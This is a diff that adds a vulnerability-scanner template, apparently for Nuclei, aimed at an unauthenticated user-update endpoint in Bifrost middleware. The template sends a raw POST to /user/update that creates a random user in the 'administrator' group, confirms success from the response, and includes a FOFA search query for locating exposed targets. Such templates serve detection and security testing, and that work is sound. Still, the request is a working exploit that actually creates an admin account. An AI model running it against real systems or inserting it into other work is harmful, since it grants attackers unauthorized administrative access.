@@ -1,0 +1,33 @@
+id: bifrost-zzj-update-unauth
+
+info:
+  name: bifrost-zzj-update-unauth
+  author: unknow
+  severity: high
+  description: bifrost 中间件 update处存在用户添加漏洞。
+  tags: bifrost,unauth
+  metadata:
+    fofa-qeury: body="/dologin" && body="Bifrost"
+
+variables:
+  rand7: "{{rand_text_numeric(7)}}"
+
+requests:
+  - raw:
+      - |          
+        POST /user/update HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+
+        {"UserName":"{{username-password}}","Password":"{{username-password}}","Group":"administrator","Host":""}
+
+    payloads:
+      username-password:
+        - "{{rand7}}"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==302 && contains(body, "{\"status\":1,\"msg\":\"success\",\"data\":null}") && contains(header, "text/plain")'
